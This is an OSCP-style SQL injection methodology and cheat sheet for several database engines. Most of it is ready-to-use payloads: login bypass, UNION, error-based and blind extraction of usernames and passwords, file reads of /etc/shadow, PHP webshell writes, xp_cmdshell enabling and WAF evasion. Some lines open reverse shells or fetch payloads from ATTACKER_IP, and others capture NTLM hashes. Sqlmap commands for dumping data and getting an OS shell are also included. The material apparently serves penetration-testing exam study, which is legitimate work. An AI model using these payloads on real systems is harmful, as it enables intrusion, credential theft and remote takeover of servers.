# SQL Injection — Complete OSCP Methodology


---

## Table of Contents

1. [Detection & Confirmation](#1-detection--confirmation)
2. [Authentication Bypass](#2-authentication-bypass)
3. [UNION-Based Injection](#3-union-based-injection)
4. [Error-Based Injection](#4-error-based-injection)
5. [Blind Boolean-Based Injection](#5-blind-boolean-based-injection)
6. [Blind Time-Based Injection](#6-blind-time-based-injection)
7. [Database Enumeration (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)](#7-database-enumeration)
8. [Data Extraction — CONCAT & GROUP_CONCAT](#8-data-extraction--concat--group_concat)
9. [Reading & Writing Files](#9-reading--writing-files)
10. [Command Execution / RCE](#10-command-execution--rce)
11. [Filter & WAF Bypass Techniques](#11-filter--waf-bypass-techniques)
12. [Second-Order SQL Injection](#12-second-order-sql-injection)
13. [SQLMap Automated Methodology](#13-sqlmap-automated-methodology)
14. [Payload Quick Reference by DB](#14-payload-quick-reference-by-db)
15. [Master Checklist](#15-master-checklist)
16. [External References](#16-external-references)

---

## 1. Detection & Confirmation

### Step 1 — Find Injection Points

Test EVERY user-controlled input:
- URL parameters: `?id=1`
- POST body fields
- Cookie values
- HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
- JSON/XML values in API bodies
- Search fields, sort/order parameters, login forms

### Step 2 — Probe for SQLi

Inject these one at a time and observe the response:

| Payload | What to watch for |
|---|---|
| `'` | SQL error, different response, 500 |
| `''` | Normal response returns (string closed properly) |
| `"` | SQL error |
| `1 OR 1=1` | Returns more data / all results |
| `1 OR 1=2` | Returns normal / fewer results |
| `1' OR '1'='1` | Same as above, string context |
| `1' OR '1'='2` | Baseline comparison |
| `1 AND 1=1` | Normal response |
| `1 AND 1=2` | Different/empty response = injectable |
| `1' AND 'a'='a` | String-context version |
| `1; SELECT 1--` | Stacked queries test |
| `1' ORDER BY 1--` | Column enumeration |
| `1 UNION SELECT NULL--` | UNION test |
| `1' WAITFOR DELAY '0:0:5'--` | Time-based (MSSQL) |
| `1' AND SLEEP(5)--` | Time-based (MySQL) |
| `1'; SELECT pg_sleep(5)--` | Time-based (PostgreSQL) |

### Step 3 — Determine the Context

```
Numeric:   SELECT * FROM users WHERE id = [INPUT]
String:    SELECT * FROM users WHERE name = '[INPUT]'
```

- If `1 OR 1=1` works → numeric context (no quotes needed)
- If `1' OR '1'='1` works → string context (need to close the quote)

### Step 4 — Identify the DBMS

| Fingerprint Payload | Database |
|---|---|
| `@@version` | MySQL, MSSQL |
| `VERSION()` | MySQL, PostgreSQL |
| `version()` | PostgreSQL |
| `SELECT banner FROM v$version` | Oracle |
| `sqlite_version()` | SQLite |
| `SLEEP(5)` works | MySQL |
| `WAITFOR DELAY '0:0:5'` works | MSSQL |
| `pg_sleep(5)` works | PostgreSQL |
| Concatenation with `\|\|` | Oracle, PostgreSQL, SQLite |
| Concatenation with `+` | MSSQL |
| Concatenation with `CONCAT()` | MySQL |
| `--` comment works | MySQL, PostgreSQL, SQLite, MSSQL |
| `#` comment works | MySQL |

### Comment Styles (to kill trailing SQL)

```sql
-- MySQL
' OR 1=1-- -
' OR 1=1#
' OR 1=1/*

-- MSSQL
' OR 1=1--

-- PostgreSQL
' OR 1=1--

-- Oracle
' OR 1=1--

-- SQLite
' OR 1=1--
```

> **Always try `-- -` (with trailing space/dash) for MySQL.** Just `--` without a space after often fails.

---

## 2. Authentication Bypass

Use these in login forms (username and/or password field):

### Classic Payloads

```sql
' OR 1=1--
' OR 1=1-- -
' OR 1=1#
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR ''='
admin'--
admin'-- -
admin'#
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'#
admin' OR 1=1--
admin')--
admin')#
" OR 1=1--
" OR ""="
') OR ('1'='1
') OR ('1'='1'--
```

### Target a Specific User

```sql
-- Log in as admin without password
admin'--
admin'-- -
admin'#

-- WHY: The query becomes:
-- SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Everything after -- is a comment. Password check is gone.
```

### Bypass with LIMIT

```sql
-- If OR 1=1 returns the first user (maybe not admin):
' OR 1=1 LIMIT 1,1--    ← skip first row, get second user
' OR 1=1 LIMIT 0,1--    ← first user (row 0)
```

### Bypass with No Spaces

```sql
'OR'1'='1
'OR(1=1)#
'||1=1--
```

---

## 3. UNION-Based Injection

### Prerequisite — Results Must Be Displayed on Page

UNION only works when you can see the query output on the page. If you can't see data → use Blind or Error-Based instead.

### Step 1 — Find the Number of Columns

```sql
-- Method 1: ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    ← error here means 2 columns
' ORDER BY 4--

-- Method 2: UNION SELECT NULL (add NULLs until it works)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--    ← no error = 3 columns
```

> **ORDER BY is faster** — binary search: start at 10, if error try 5, etc.

### Step 2 — Find Which Columns Are Displayed

```sql
-- Replace NULLs with test strings one at a time:
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- The column where 'a' appears on the page = your data output channel
-- If column 2 shows on page:
' UNION SELECT NULL,'INJECT_HERE',NULL--
```

### Step 3 — Extract Data

```sql
-- MySQL — version
' UNION SELECT NULL,@@version,NULL--

-- MySQL — current user
' UNION SELECT NULL,user(),NULL--

-- MySQL — current database
' UNION SELECT NULL,database(),NULL--

-- MySQL — all databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- MySQL — all tables in current DB
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- MySQL — all columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- MySQL — extract data
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

### Oracle-Specific UNION

Oracle requires `FROM dual` for every SELECT:

```sql
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT NULL,banner FROM v$version--
' UNION SELECT NULL,table_name FROM all_tables--
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

## 4. Error-Based Injection

Use the **error message itself** to extract data. Works when errors are displayed but UNION output is not.

### MySQL

```sql
-- extractvalue()
' AND extractvalue(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
' AND extractvalue(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))--

-- updatexml()
' AND updatexml(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--

-- Double query / subquery error
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- BIGINT overflow (MySQL 5.5+)
' AND !(SELECT * FROM (SELECT CONCAT(@@version))x)-~0--
```

### MSSQL

```sql
-- CONVERT error
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- CAST error
' AND 1=CAST((SELECT @@version) AS int)--
' AND 1=CAST((SELECT TOP 1 username FROM users) AS int)--
```

### PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

---

## 5. Blind Boolean-Based Injection

**When:** No data or errors displayed. Only two observable states: TRUE response vs FALSE response (content difference, status code, redirect, etc.).

### Methodology

1. Establish TRUE baseline: `' AND 1=1--` → normal page
2. Establish FALSE baseline: `' AND 1=2--` → different page
3. If they differ → boolean blind SQLi confirmed

### Character-by-Character Extraction

```sql
-- Is the first character of the DB version > 'm'?
' AND SUBSTRING(@@version,1,1) > 'm'--

-- Binary search approach: narrow down each character
' AND SUBSTRING(@@version,1,1) > 'a'--    → TRUE
' AND SUBSTRING(@@version,1,1) > 'm'--    → FALSE
' AND SUBSTRING(@@version,1,1) > 'g'--    → TRUE
' AND SUBSTRING(@@version,1,1) > 'j'--    → FALSE
-- etc. until you isolate the exact character
```

### Extracting Data — Step by Step

```sql
-- 1. Get the length of the database name
' AND LENGTH(database()) = 1--
' AND LENGTH(database()) = 2--
' AND LENGTH(database()) = 5--    ← TRUE = DB name is 5 chars

-- 2. Extract character by character (MySQL)
' AND SUBSTRING(database(),1,1) = 'a'--
' AND SUBSTRING(database(),1,1) = 'b'--
-- ... or use ASCII for binary search:
' AND ASCII(SUBSTRING(database(),1,1)) > 96--    → TRUE
' AND ASCII(SUBSTRING(database(),1,1)) > 112--   → FALSE
' AND ASCII(SUBSTRING(database(),1,1)) > 104--   → TRUE
-- ... narrow to exact ASCII value, convert to character

-- 3. Extract table names
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1) = 'u'--

-- 4. Extract column names
' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1) = 'i'--

-- 5. Extract data
' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1) = 'a'--
```

### MSSQL Boolean

```sql
' AND UNICODE(SUBSTRING((SELECT TOP 1 name FROM sysdatabases),1,1)) > 96--
```

### PostgreSQL Boolean

```sql
' AND (SELECT SUBSTRING(version(),1,1)) = 'P'--
```

> **Pro tip:** This is extremely slow manually. Use **sqlmap** for boolean blind — it automates the binary search.

---

## 6. Blind Time-Based Injection

**When:** No visible difference between TRUE and FALSE. The ONLY signal is response delay.

### MySQL

```sql
-- Confirm injection
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--     ← 5 sec delay = injectable
' AND IF(1=2,SLEEP(5),0)--     ← no delay = comparison works

-- Extract data
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(5),0)--

-- Extract table name
' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u',SLEEP(5),0)--

-- Extract password
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a',SLEEP(5),0)--
```

### MSSQL

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
'; IF (ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))>96) WAITFOR DELAY '0:0:5'--
```

### PostgreSQL

```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='u') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### SQLite

```sql
' AND CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END--
-- SQLite has no SLEEP — use heavy computation as delay
```

> **Tip:** Set sleep to 2-3 seconds max on exams. Too long = slow extraction. Too short = network jitter false positives.

---

## 7. Database Enumeration

### MySQL

```sql
-- Version
SELECT @@version;
SELECT VERSION();

-- Current user
SELECT user();
SELECT current_user();

-- Current database
SELECT database();

-- All databases
SELECT schema_name FROM information_schema.schemata;

-- All tables in a database
SELECT table_name FROM information_schema.tables WHERE table_schema = 'target_db';
-- Current database:
SELECT table_name FROM information_schema.tables WHERE table_schema = database();

-- All columns in a table
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
-- With DB qualifier:
SELECT column_name FROM information_schema.columns WHERE table_schema = 'target_db' AND table_name = 'users';

-- Dump data
SELECT username, password FROM users;
SELECT CONCAT(username,':',password) FROM users;
SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM users;

-- Check privileges
SELECT super_priv FROM mysql.user WHERE user = 'root';
SELECT grantee, privilege_type FROM information_schema.user_privileges;

-- Check if FILE privilege (needed for file read/write)
SELECT file_priv FROM mysql.user WHERE user = current_user();
```

### MSSQL

```sql
-- Version
SELECT @@version;

-- Current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Current database
SELECT DB_NAME();

-- All databases
SELECT name FROM master..sysdatabases;
-- or
SELECT name FROM sys.databases;

-- All tables
SELECT name FROM sysobjects WHERE xtype = 'U';
-- or
SELECT table_name FROM information_schema.tables;

-- All columns
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
-- or
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');

-- Dump data
SELECT username, password FROM users;

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1 = yes

-- Linked servers (pivot)
SELECT srvname FROM master..sysservers;
-- Execute on linked server:
EXEC ('SELECT @@version') AT [LINKED_SERVER_NAME];

-- List all logins
SELECT name, type_desc FROM sys.server_principals;
```

### PostgreSQL

```sql
-- Version
SELECT version();

-- Current user
SELECT current_user;
SELECT user;

-- Current database
SELECT current_database();

-- All databases
SELECT datname FROM pg_database;

-- All tables
SELECT tablename FROM pg_tables WHERE schemaname = 'public';
-- or
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';

-- All columns
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

-- Dump data
SELECT username || ':' || password FROM users;

-- Check if superuser
SELECT current_setting('is_superuser');  -- 'on' = yes

-- List users and roles
SELECT usename, usesuper FROM pg_user;
```

### Oracle

```sql
-- Version
SELECT banner FROM v$version;
SELECT version FROM v$instance;

-- Current user
SELECT USER FROM dual;

-- All tables (owned by you)
SELECT table_name FROM user_tables;

-- All tables (all users)
SELECT owner, table_name FROM all_tables;

-- Columns
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';

-- Dump data (Oracle uses || for concat)
SELECT username || ':' || password FROM users;

-- Check privileges
SELECT * FROM user_role_privs;
SELECT * FROM user_sys_privs;
```

### SQLite

```sql
-- Version
SELECT sqlite_version();

-- All tables
SELECT name FROM sqlite_master WHERE type = 'table';
-- or
SELECT tbl_name FROM sqlite_master WHERE type = 'table' AND tbl_name NOT LIKE 'sqlite_%';

-- Table schema (shows CREATE TABLE with columns)
SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'users';

-- Dump data
SELECT username || ':' || password FROM users;

-- SQLite has no user system — runs as the app process
```

---

## 8. Data Extraction — CONCAT & GROUP_CONCAT

When you only have ONE output column, you need to concatenate multiple values:

### MySQL

```sql
-- Single row, multiple columns
CONCAT(username, ':', password)
CONCAT(username, 0x3a, password)         -- 0x3a = ':'
CONCAT_WS(':', username, password)       -- with separator

-- Multiple rows into one string
GROUP_CONCAT(username, ':', password SEPARATOR '\n')
GROUP_CONCAT(username, 0x3a, password SEPARATOR 0x0a)

-- Full dump in one shot
' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users--
```

### MSSQL

```sql
-- Concatenation
username + ':' + password

-- Multiple rows (MSSQL 2017+)
STRING_AGG(username + ':' + password, CHAR(10))

-- Older MSSQL — XML trick for multi-row
STUFF((SELECT ',' + username + ':' + password FROM users FOR XML PATH('')),1,1,'')
```

### PostgreSQL

```sql
-- Concatenation
username || ':' || password

-- Multiple rows
STRING_AGG(username || ':' || password, E'\n')
-- or
array_to_string(ARRAY(SELECT username || ':' || password FROM users), E'\n')
```

### Oracle

```sql
-- Concatenation
username || ':' || password

-- Multiple rows (Oracle 11g+)
LISTAGG(username || ':' || password, CHR(10)) WITHIN GROUP (ORDER BY username)
```

---

## 9. Reading & Writing Files

### MySQL — Read Files

```sql
-- Requires FILE privilege
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL--
' UNION SELECT NULL,LOAD_FILE('/etc/shadow'),NULL--

-- Hex-encode path to bypass filters
' UNION SELECT NULL,LOAD_FILE(0x2f6574632f706173737764),NULL--

-- Check if you have FILE priv
' UNION SELECT NULL,file_priv,NULL FROM mysql.user WHERE user=current_user()--
```

### MySQL — Write Files (Webshell)

```sql
-- Requires FILE privilege AND writable web directory
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--

-- Alternative with hex to bypass quote filters
' UNION SELECT NULL,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,NULL INTO OUTFILE '/var/www/html/shell.php'--

-- Then access: http://target.com/shell.php?cmd=id

-- DUMPFILE (binary-safe, single row)
' UNION SELECT NULL,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO DUMPFILE '/var/www/html/shell.php'--
```

### MSSQL — Read Files

```sql
-- Bulk insert (requires ADMINISTER BULK OPERATIONS)
CREATE TABLE #tmp (content NVARCHAR(MAX));
BULK INSERT #tmp FROM 'C:\inetpub\wwwroot\web.config';
SELECT content FROM #tmp;

-- Read via OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;
```

### MSSQL — Write Files

```sql
-- Enable and use OLE Automation
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @o INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @o OUT;
EXEC sp_OAMethod @o, 'OpenTextFile', NULL, 'C:\inetpub\wwwroot\shell.aspx', 8, 1;
-- (see RCE section for full webshell write)
```

### PostgreSQL — Read Files

```sql
-- Superuser only
SELECT pg_read_file('/etc/passwd');

-- Via COPY
CREATE TABLE tmp(content text);
COPY tmp FROM '/etc/passwd';
SELECT content FROM tmp;
```

### PostgreSQL — Write Files

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

---

## 10. Command Execution / RCE

### MySQL — Via Webshell (most common path)

```sql
-- 1. Write a webshell (see section 9)
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'--

-- 2. Execute commands
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=cat+/etc/passwd"
curl "http://target.com/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

### MySQL — Via UDF (User-Defined Function)

```sql
-- Advanced: load a shared library for command execution
-- Requires FILE priv and plugin directory write access
-- sqlmap can automate: sqlmap --os-shell
```

### MSSQL — xp_cmdshell

```sql
-- Check if enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir C:\';
EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config';

-- Reverse shell
EXEC xp_cmdshell 'powershell -e <base64_encoded_payload>';
-- Generate payload:
-- msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe > shell.exe
-- Or use PowerShell one-liner
EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/shell.ps1")';
```

### MSSQL — Steal NetNTLM Hash

```sql
-- Force MSSQL to authenticate to your SMB server
EXEC master..xp_dirtree '\\ATTACKER_IP\share';
-- or
EXEC master..xp_fileexist '\\ATTACKER_IP\share';

-- Catch with Responder or Impacket
sudo responder -I tun0
-- or
sudo python3 impacket-smbserver share . -smb2support
```

### PostgreSQL — Command Execution

```sql
-- Via COPY TO/FROM PROGRAM (PostgreSQL 9.3+, superuser)
COPY (SELECT '') TO PROGRAM 'id';

-- With output
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT output FROM cmd_output;

-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';
```

---

## 11. Filter & WAF Bypass Techniques

### Space Blocked

```sql
-- Use comments as spaces
'/**/OR/**/1=1--
'/**/UNION/**/SELECT/**/NULL,NULL--

-- Use tabs
' OR	1=1--   (literal tab character, %09)

-- Use newlines
' OR%0a1=1--

-- Use parentheses
'OR(1=1)--
'UNION(SELECT(NULL),(NULL))--

-- Use + (URL encoded space)
'+OR+1=1--
```

### Quotes Blocked

```sql
-- Use hex for strings
SELECT * FROM users WHERE name = 0x61646d696e    -- 'admin'

-- Use CHAR()
SELECT * FROM users WHERE name = CHAR(97,100,109,105,110)

-- Numeric context doesn't need quotes
WHERE id = 1 OR 1=1
```

### Keywords Blocked (SELECT, UNION, etc.)

```sql
-- Case variation
uNiOn SeLeCt
UnIoN sElEcT

-- Double encoding
%2553%2545%254C%2545%2543%2554    -- SELECT

-- Inline comments (MySQL)
UN/**/ION SE/**/LECT
UNI/**_**/ON SEL/**_**/ECT
/*!50000UNION*//*!50000SELECT*/

-- Concatenation of keywords
'UN' + 'ION' + ' SE' + 'LECT'

-- URL encoding
%55NION %53ELECT
%75nion %73elect
```

### AND/OR Blocked

```sql
-- Use && and ||
' && 1=1--
' || 1=1--

-- Use arithmetic
' - 0 OR 1=1--

-- Nested conditions
' LIKE 1--
```

### Comma Blocked (breaks UNION SELECT, SUBSTRING, LIMIT)

```sql
-- UNION without commas: use JOIN
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--

-- SUBSTRING without commas
SUBSTRING(database() FROM 1 FOR 1)
-- instead of SUBSTRING(database(),1,1)

-- LIMIT without commas
LIMIT 1 OFFSET 0
-- instead of LIMIT 0,1

-- IF without commas: use CASE
CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END
-- instead of IF(1=1,SLEEP(5),0)
```

### equals `=` Blocked

```sql
-- Use LIKE
' OR 1 LIKE 1--
' AND SUBSTRING(database(),1,1) LIKE 'a'--

-- Use IN
' OR 1 IN (1)--

-- Use BETWEEN
' AND SUBSTRING(database(),1,1) BETWEEN 'a' AND 'a'--

-- Use REGEXP
' AND database() REGEXP '^a'--

-- Use < and >
' AND NOT 1 > 1--
```

### WAF Bypass — Advanced

```sql
-- HTTP Parameter Pollution
-- Send same parameter twice; WAF checks first, app uses second:
?id=1&id=' UNION SELECT 1,2,3--

-- Chunked transfer encoding
-- Break payload across chunks so WAF doesn't reassemble

-- JSON/XML encapsulation (when app parses these)
{"id":"1 UNION SELECT 1,2,3-- -"}

-- Null bytes
?id=1%00' UNION SELECT 1,2,3--

-- Overflow WAF buffer
?id=1 AND 1=1 AND 1=1 AND 1=1 ... (repeated 1000x) ... UNION SELECT 1,2,3--
```

---

## 12. Second-Order SQL Injection

**What:** Your payload is stored first, then executed later in a different query.

**Example:**
1. Register username: `admin'--`
2. The app stores this in the DB safely (parameterized INSERT)
3. Later, a password change query uses the stored username **unsafely**:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. The `--` comments out the rest → you changed admin's password

**How to test:**
- Register accounts with SQLi payloads as the username
- Then trigger every feature that uses the username: profile update, password change, posting, messaging
- Watch for errors or behavioral changes

---

## 13. SQLMap Automated Methodology

### Basic Usage

```bash
# GET parameter
sqlmap -u "http://target.com/page?id=1" -p id

# POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username

# With cookies
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# With headers
sqlmap -u "http://target.com/page?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# From Burp request file (BEST METHOD — save request from Burp → right-click → Copy to file)
sqlmap -r request.txt
```

### Detection & Fingerprinting

```bash
# Detect SQLi type and DBMS
sqlmap -r request.txt --batch --banner

# Skip detection, force DBMS
sqlmap -r request.txt --dbms=mysql

# Skip detection, force technique
sqlmap -r request.txt --technique=BT
# B=Boolean, E=Error, U=UNION, S=Stacked, T=Time

# Increase level and risk
sqlmap -r request.txt --level=5 --risk=3
# level=5 tests cookies, headers, User-Agent
# risk=3 uses heavy/dangerous payloads (OR-based)

# Verbose output
sqlmap -r request.txt -v 3
```

### Enumeration

```bash
# Current user
sqlmap -r request.txt --current-user

# Current database
sqlmap -r request.txt --current-db

# Is DBA?
sqlmap -r request.txt --is-dba

# List all databases
sqlmap -r request.txt --dbs

# List tables in a database
sqlmap -r request.txt -D target_db --tables

# List columns in a table
sqlmap -r request.txt -D target_db -T users --columns

# Dump a table
sqlmap -r request.txt -D target_db -T users --dump

# Dump specific columns
sqlmap -r request.txt -D target_db -T users -C username,password --dump

# Dump everything (CAREFUL — slow and loud)
sqlmap -r request.txt --dump-all
```

### Exploitation / RCE

```bash
# Read a file
sqlmap -r request.txt --file-read="/etc/passwd"
sqlmap -r request.txt --file-read="C:/inetpub/wwwroot/web.config"

# Write a file (webshell)
sqlmap -r request.txt --file-write="./shell.php" --file-dest="/var/www/html/shell.php"

# OS shell (interactive)
sqlmap -r request.txt --os-shell

# SQL shell (interactive)
sqlmap -r request.txt --sql-shell

# OS command
sqlmap -r request.txt --os-cmd="whoami"
```

### Performance & Stealth

```bash
# Threads (speed up blind injection)
sqlmap -r request.txt --threads=10

# Delay between requests
sqlmap -r request.txt --delay=1

# Random User-Agent
sqlmap -r request.txt --random-agent

# Use Tor
sqlmap -r request.txt --tor --tor-type=SOCKS5

# Tamper scripts (bypass WAF)
sqlmap -r request.txt --tamper=space2comment
sqlmap -r request.txt --tamper=between,randomcase,space2comment
sqlmap -r request.txt --tamper=charencode

# List all tamper scripts
sqlmap --list-tampers
```

### Common Tamper Scripts

| Script | What it does |
|---|---|
| `space2comment` | Replaces spaces with `/**/` |
| `between` | Replaces `>` with `NOT BETWEEN 0 AND` |
| `randomcase` | Random upper/lower case |
| `charencode` | URL-encodes all characters |
| `equaltolike` | Replaces `=` with `LIKE` |
| `base64encode` | Base64 encodes the payload |
| `space2plus` | Replaces spaces with `+` |
| `unionalltounion` | Replaces `UNION ALL` with `UNION` |
| `percentage` | Adds `%` between chars: `S%E%L%E%C%T` |

### SQLMap Pro Tips

```bash
# If you found SQLi manually and know the injection point:
# Use * to mark the injection point in the request file
# Example in request.txt:
#   GET /page?id=1* HTTP/1.1

# Prefix/suffix for tricky injection
sqlmap -r request.txt --prefix="')" --suffix="-- -"

# Second-order injection
sqlmap -r request.txt --second-url="http://target.com/profile"

# Crawl and test all parameters
sqlmap -u "http://target.com/" --crawl=2 --batch

# Fresh start (clear cache)
sqlmap -r request.txt --flush-session
```

---

## 14. Payload Quick Reference by DB

### MySQL

```sql
-- String concat:    CONCAT('a','b') or 'a' 'b'
-- Comment:          -- - or # or /**/
-- Conditional:      IF(cond,true,false)
-- Time delay:       SLEEP(5)
-- Substring:        SUBSTRING(str,pos,len) or MID(str,pos,len)
-- ASCII value:      ASCII('A') → 65 / ORD('A') → 65
-- Char from int:    CHAR(65) → 'A'
-- Length:           LENGTH('abc') → 3
-- Current user:     USER() / CURRENT_USER()
-- Current DB:       DATABASE()
-- Read file:        LOAD_FILE('/etc/passwd')
-- Write file:       INTO OUTFILE '/path/file'
-- Info schema:      information_schema.tables, .columns
-- Stacked queries:  Supported (depends on driver — mysqli yes, mysql_query no)
```

### MSSQL

```sql
-- String concat:    'a' + 'b'
-- Comment:          --
-- Conditional:      IF/ELSE or CASE WHEN
-- Time delay:       WAITFOR DELAY '0:0:5'
-- Substring:        SUBSTRING(str,pos,len)
-- ASCII value:      ASCII('A') / UNICODE(N'A')
-- Char from int:    CHAR(65)
-- Length:           LEN('abc')
-- Current user:     SYSTEM_USER / USER_NAME()
-- Current DB:       DB_NAME()
-- Read file:        OPENROWSET(BULK...)
-- Exec commands:    xp_cmdshell 'cmd'
-- Info schema:      information_schema.tables, sysobjects, syscolumns
-- Stacked queries:  YES (always supported)
```

### PostgreSQL

```sql
-- String concat:    'a' || 'b'
-- Comment:          --
-- Conditional:      CASE WHEN cond THEN x ELSE y END
-- Time delay:       pg_sleep(5)
-- Substring:        SUBSTRING(str,pos,len) or SUBSTR(str FROM pos FOR len)
-- ASCII value:      ASCII('A')
-- Char from int:    CHR(65)
-- Length:           LENGTH('abc')
-- Current user:     current_user / user
-- Current DB:       current_database()
-- Read file:        pg_read_file('/etc/passwd')
-- Write file:       COPY ... TO '/path/file'
-- Exec commands:    COPY ... TO PROGRAM 'cmd'
-- Info schema:      information_schema.tables, pg_tables
-- Stacked queries:  YES (always supported)
```

### Oracle

```sql
-- String concat:    'a' || 'b'
-- Comment:          --
-- Conditional:      CASE WHEN cond THEN x ELSE y END
-- Time delay:       DBMS_PIPE.RECEIVE_MESSAGE('a',5) or heavy query
-- Substring:        SUBSTR(str,pos,len)
-- ASCII value:      ASCII('A')
-- Char from int:    CHR(65)
-- Length:           LENGTH('abc')
-- Current user:     USER / SYS_CONTEXT('USERENV','CURRENT_USER')
-- Dummy table:      FROM dual (REQUIRED for every SELECT)
-- Info schema:      all_tables, all_tab_columns, user_tables
-- Stacked queries:  NO (via API only, not in-band)
```

### SQLite

```sql
-- String concat:    'a' || 'b'
-- Comment:          --
-- Conditional:      CASE WHEN cond THEN x ELSE y END
-- Time delay:       randomblob(500000000) — heavy computation
-- Substring:        SUBSTR(str,pos,len)
-- ASCII value:      UNICODE('A')
-- Char from int:    CHAR(65)
-- Length:           LENGTH('abc')
-- Tables:           sqlite_master (name, sql columns)
-- Stacked queries:  YES (if API allows)
```

---

## 15. Master Checklist

### Detection

- [ ] Test every GET/POST parameter with `'`, `"`, `\`
- [ ] Test numeric params: `1 AND 1=1` vs `1 AND 1=2`
- [ ] Test string params: `' AND '1'='1` vs `' AND '1'='2`
- [ ] Test headers: User-Agent, Referer, X-Forwarded-For, Cookie
